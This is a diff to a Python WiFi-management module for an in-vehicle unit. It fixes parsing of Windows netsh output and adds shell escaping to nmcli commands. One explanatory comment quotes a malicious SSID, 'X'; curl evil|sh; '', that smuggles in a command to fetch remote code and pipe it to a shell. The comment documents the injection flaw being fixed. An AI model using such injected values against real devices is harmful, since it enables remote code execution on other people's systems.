@@ -50,7 +50,7 @@ import time
 from dataclasses import dataclass, field
 from typing import List, Optional
 
-from .ssh import Remote
+from .ssh import Remote, _shquote
 
 # 有线直连时车机的固定地址。这是硬件事实，不随产品变化，
 # 因此可以写在代码里（与「产品话题」不同）。
@@ -85,6 +85,59 @@ class HostWifi:
 # 本机（电脑）侧
 # ---------------------------------------------------------------------------
 
+def parse_netsh_output(out: str) -> tuple:
+    """解析 `netsh wlan show interfaces` 的输出，返回 (ssid, state, connected)。
+
+    **必须按「行首键名」匹配，不能用子串匹配。**
+
+    中文 Windows 的输出里有三行都含「状态」：
+
+        状态                  : 已连接        ← 真正想要的
+        无线电状态            : 硬件 开       ← 也含「状态」
+        承载网络状态          : 不可用         ← 也含「状态」
+
+    循环按行跑，最后一行赢 —— 于是 state 变成「不可用」，
+    连着的 WiFi 被判成未连接，有线模式直接罢工。
+    （2026-11-05 审查用真实输出复现并证实的缺陷。）
+
+    同样不能对 state 做 `"connected" in state.lower()` 的子串判断：
+    `disconnected` 里也含 `connected`。
+    """
+    ssid = ""
+    state = ""
+
+    for line in out.splitlines():
+        s = line.strip()
+        if not s:
+            continue
+        # 用 split(":", 1)：SSID 本身可以含冒号（合法），
+        # partition 会在第一个冒号处切，值仍然完整，但显式写更清楚。
+        parts = s.split(":", 1)
+        if len(parts) != 2:
+            continue
+        key = parts[0].strip()
+        value = parts[1].strip()
+        low_key = key.lower()
+
+        # BSSID 行也以 SSID 结尾，必须先排除
+        if "bssid" in low_key:
+            continue
+        if low_key.startswith("ssid"):
+            ssid = value
+        elif low_key.startswith("state") or key.startswith("状态"):
+            state = value
+
+    low_state = state.lower()
+    # 先排否定词，再认肯定词，避免 disconnected 被当成 connected
+    negative = ("disconnect" in low_state
+                or "断开" in state
+                or "未连接" in state)
+    positive = (low_state.strip() == "connected"
+                or state.strip() == "已连接")
+
+    return ssid, state, bool(ssid) and positive and not negative
+
+
 def host_wifi() -> HostWifi:
     """读电脑当前连的 WiFi 名称。
 
@@ -100,18 +153,7 @@ def host_wifi() -> HostWifi:
     except (OSError, subprocess.SubprocessError):
         return HostWifi()
 
-    ssid = ""
-    state = ""
-    for line in out.splitlines():
-        stripped = line.strip()
-        if stripped.startswith("SSID") and "BSSID" not in stripped:
-            # 中英文系统都可能有 "SSID : xxx"
-            _, _, value = stripped.partition(":")
-            ssid = value.strip()
-        elif "State" in stripped or "状态" in stripped:
-            _, _, value = stripped.partition(":")
-            state = value.strip()
-    connected = bool(ssid) and ("connected" in state.lower() or "已连接" in state)
+    ssid, _state, connected = parse_netsh_output(out)
     return HostWifi(connected=connected, ssid=ssid)
 
 
@@ -266,18 +308,26 @@ def join_wireless(remote: Remote, ssid: str, password: str,
     if not ssid:
         return False, "没有指定 WiFi 名称"
 
+    # SSID 与密码都要过 shell 转义。
+    # 这两个入参都不是我们自己控制的：
+    #   · ssid 来自车上 `nmcli device wifi list` 的输出 —— 附近任何 AP
+    #     都能把自己的名字设成 `X'; curl evil|sh; '`
+    #   · password 是用户手输，随手一个含单引号的密码就触发
+    # 不转义就等于允许外部输入在车上执行任意命令（以 sunrise 身份）。
+    q_ssid = _shquote(ssid)
+
     # 已有同名连接就直接 up 它，避免重复创建
     existing = remote.run(
-        f"nmcli -t -f NAME connection show | grep -Fx '{ssid}' || true",
+        f"nmcli -t -f NAME connection show | grep -Fx {q_ssid} || true",
         timeout=15, record=False,
     ).stdout.strip()
 
     if existing:
-        cmd = f"nmcli connection up '{ssid}'"
+        cmd = f"nmcli connection up {q_ssid}"
     else:
         if not password:
             return False, "该 WiFi 需要密码，但未提供"
-        cmd = f"nmcli device wifi connect '{ssid}' password '{password}'"
+        cmd = f"nmcli device wifi connect {q_ssid} password {_shquote(password)}"
 
     result = remote.run(f"timeout {timeout} {cmd} 2>&1", timeout=timeout + 15)
     text = (result.stdout or "").strip()
